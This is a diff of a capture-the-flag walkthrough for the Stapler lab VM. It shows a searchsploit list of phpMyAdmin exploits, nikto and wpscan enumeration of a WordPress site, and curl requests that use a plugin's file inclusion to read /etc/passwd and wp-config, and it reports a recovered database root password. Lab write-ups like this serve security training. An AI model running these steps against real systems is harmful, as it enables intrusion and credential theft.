+phpMyAdmin 2.6.3-pl1 - Cross-Site Scripting / Full Path                                      | exploits/php/webapps/12642.txt
+phpMyAdmin 2.6.4-pl1 - Directory Traversal                                                   | exploits/php/webapps/1244.pl
+phpMyAdmin 2.7 - 'sql.php' Cross-Site Scripting                                              | exploits/php/webapps/27632.txt
+phpMyAdmin 2.8.1 - Set_Theme Cross-Site Scripting                                            | exploits/php/webapps/27435.txt
+phpMyAdmin 2.9.1 - Multiple Cross-Site Scripting Vulnerabilities                             | exploits/php/webapps/29895.txt
+phpMyAdmin 2.x - 'Export.php' File Disclosure                                                | exploits/php/webapps/23640.txt
+phpMyAdmin 2.x - 'db_create.php?db' Cross-Site Scripting                                     | exploits/php/webapps/29058.txt
+phpMyAdmin 2.x - 'db_operations.php' Multiple Cross-Site Scripting Vulnerabilities           | exploits/php/webapps/29059.txt
+phpMyAdmin 2.x - 'error.php' Cross-Site Scripting                                            | exploits/php/webapps/26199.txt
+phpMyAdmin 2.x - 'queryframe.php' Cross-Site Scripting                                       | exploits/php/webapps/26392.txt
+phpMyAdmin 2.x - 'querywindow.php' Multiple Cross-Site Scripting Vulnerabilities             | exploits/php/webapps/29060.txt
+phpMyAdmin 2.x - 'server_databases.php' Cross-Site Scripting                                 | exploits/php/webapps/26393.txt
+phpMyAdmin 2.x - 'sql.php?pos' Cross-Site Scripting                                          | exploits/php/webapps/29061.txt
+phpMyAdmin 2.x - Convcharset Cross-Site Scripting                                            | exploits/php/webapps/25330.txt
+phpMyAdmin 2.x - External Transformations Remote Command Execution                           | exploits/php/webapps/24817.txt
+phpMyAdmin 2.x - Information Disclosure                                                      | exploits/php/webapps/22798.txt
+phpMyAdmin 2.x - Multiple Script Array Handling Full Path Disclosures                        | exploits/php/webapps/29062.txt
+phpMyAdmin 3.0.1 - 'pmd_pdf.php' Cross-Site Scripting                                        | exploits/php/webapps/32531.txt
+phpMyAdmin 3.1.0 - Cross-Site Request Forgery / SQL Injection                                | exploits/php/webapps/7382.txt
+phpMyAdmin 3.2 - 'server_databases.php' Remote Command Execution                             | exploits/php/webapps/32383.txt
+phpMyAdmin 3.3.0 - 'db' Cross-Site Scripting                                                 | exploits/php/webapps/33060.txt
+phpMyAdmin 3.3.x/3.4.x - Local File Inclusion via XML External Entity Injection (Metasploit) | exploits/php/webapps/18371.rb
+phpMyAdmin 3.5.2.2 - 'server_sync.php' Backdoor (Metasploit)                                 | exploits/php/webapps/21834.rb
+phpMyAdmin 3.5.8/4.0.0-RC2 - Multiple Vulnerabilities                                        | exploits/php/webapps/25003.txt
+phpMyAdmin 3.x - Swekey Remote Code Injection                                                | exploits/php/webapps/17514.php
+phpMyAdmin 4.0.x/4.1.x/4.2.x - Denial of Service                                             | exploits/php/dos/35539.txt
+phpMyAdmin 4.6.2 - (Authenticated) Remote Code Execution                                     | exploits/php/webapps/40185.py
+phpMyAdmin 4.7.x - Cross-Site Request Forgery                                                | exploits/php/webapps/45284.txt
+phpMyAdmin 4.8 - Cross-Site Request Forgery                                                  | exploits/php/webapps/46982.txt
+phpMyAdmin 4.8.0 < 4.8.0-1 - Cross-Site Request Forgery                                      | exploits/php/webapps/44496.html
+phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                  | exploits/php/webapps/44924.txt
+phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                  | exploits/php/webapps/44928.txt
+phpMyAdmin 4.8.4 - 'AllowArbitraryServer' Arbitrary File Read                                | exploits/php/webapps/46041.py
+phpMyAdmin3 (pma3) - Remote Code Execution                                                   | exploits/php/webapps/17510.py
+--------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+
+```
 
 Lets turn our attention to the Wordpress site, again from the source code it looks pretty standard wordpress.
 
@@ -719,8 +1031,8 @@ theres a bit of a redirect, lets curl it and view the headers
 > TODO get outputs
 
 ```
-curl -k https://192.168.56.104:12380/blogblog/wp-admin -I
-curl -k https://192.168.56.104:12380/blogblog/wp-admin -IL
+curl -k https://$STAPLER_IP:12380/blogblog/wp-admin -I
+curl -k https://$STAPLER_IP:12380/blogblog/wp-admin -IL
 ```
 
 Some Custom headers, auth perhaps? Remember the source code from the share? 
@@ -731,14 +1043,14 @@ Instead lets look to WP to see if it is carrying any of its halmark weaknesses..
 
 first lets kick off a nikto scan:
 ``` bash
-nikto -h https://192.168.56.104:12380/blogblog/ > HTTPSblogblog.txt
+nikto -h https://$STAPLER_IP:12380/blogblog/ > HTTPSblogblog.txt
 ```
 
 looks like a standard wp site, lets dig deeper
 
 ``` bash
 # check for users using wpscan
-wpscan --url https://192.168.56.104:12380/blogblog/ --enumerate u --disable-tls-checks -o wpscan_users.txt
+wpscan --url https://$STAPLER_IP:12380/blogblog/ --enumerate u --disable-tls-checks -o wpscan_users.txt
 ```
 
 wpscan also has a mode for checking vuln plugins, but I typically have limited success in determining _vulnerable_ plugins with this tool, we'll search for all plugins and check manually.
@@ -746,7 +1058,7 @@ wpscan also has a mode for checking vuln plugins, but I typically have limited s
 > TODO link file
 
 ```
-wpscan --url https://192.168.56.104:12380/blogblog/ --enumerate ap --disable-tls-checks --plugins-detection aggressive -o wpscan_plugins.txt
+wpscan --url https://$STAPLER_IP:12380/blogblog/ --enumerate ap --disable-tls-checks --plugins-detection aggressive -o wpscan_plugins.txt
 ```
 this takes a little time, but eventually we see directory listing is available and the plugins are here ```https://192.168.56.104:12380/blogblog/wp-content/plugins/```
 
@@ -830,7 +1142,7 @@ and within uploads, what looks like a random image:
 Trying to open in it in the browser gives us errors, but that is because the file is not actually a jpeg and the browser is expecting a jpeg, lets curl it:
 
 ``` bash
-curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/108293608.jpeg
+curl -k https://$STAPLER_IP:12380/blogblog/wp-content/uploads/108293608.jpeg
 ```
 
 mwah hahaha! We have LFI! With the contents of the /etc/passwd we also have every system user, we can now attempt a fine scoped brute force login attempt.
@@ -908,13 +1220,13 @@ https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publish
 then curling:
 
 ``` bash
-curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/1006632345.jpeg
+curl -k https://$STAPLER_IP:12380/blogblog/wp-content/uploads/1006632345.jpeg
 ```
 
 quick way to refernce only the dB details:
 
 ``` bash
-curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/1006632345.jpeg | grep "DB"
+curl -k https://$STAPLER_IP:12380/blogblog/wp-content/uploads/1006632345.jpeg | grep "DB"
 ```
 yields root:plbkac as the dB root password
 
